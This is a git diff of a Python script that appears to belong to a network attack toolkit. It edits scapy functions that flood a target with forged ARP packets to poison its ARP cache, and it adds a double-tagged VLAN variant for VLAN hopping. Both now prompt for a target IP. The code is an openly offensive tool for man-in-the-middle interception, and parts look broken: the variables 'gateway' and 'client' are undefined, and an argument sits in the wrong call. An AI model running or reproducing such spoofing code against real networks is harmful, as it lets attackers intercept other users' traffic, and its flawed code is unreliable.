@@ -12,16 +12,17 @@ from termcolor import colored
 import netifaces
 import ipaddress
 from identifiers.mac import *
+
+#----------------------------------------------------------------------------------------------------------------------------------------------------------
+
 #variables in the rich library
 console = Console()
-#----------------------------------------------------------------------------------------------------------------------------------------------------------
-    
 
 #----------------------------------------------------------------------------------------------------------------------------------------------------------
 
-    # scapy poison packet insertions under layer2 protocol 
+    # scapy poison packet interferes with ARP table cache 
 def arp_cache_poison(target_ip, router_ip, router_mac, target_mac, source_mac):
-
+    target_ip = console.input("[yellow]| Enter Target IP:")
     target_mac = get_mac(target_ip)
     if not target_mac:
         console.print(f"[red] Could not resolve MAC for {target_ip}")
@@ -35,7 +36,13 @@ def arp_cache_poison(target_ip, router_ip, router_mac, target_mac, source_mac):
     sendp(Ether(dst=target_mac)/ARP(op="who-has", psrc=gateway, pdst=client),
         inter=RandNum(10,40), loop=1)
 
+
+
+
 def arp_vlan_poison():
+    target_ip = console.input("[yellow]| Enter Target IP:")
+    target_mac = get_mac(target_ip)
+
     sendp(Ether(dst=target_mac)/Dot1Q(vlan=1)/Dot1Q(vlan=2)
         /ARP(op="who-has", psrc=gateway, pdst=client,
         inter=RandNum(10,40)))
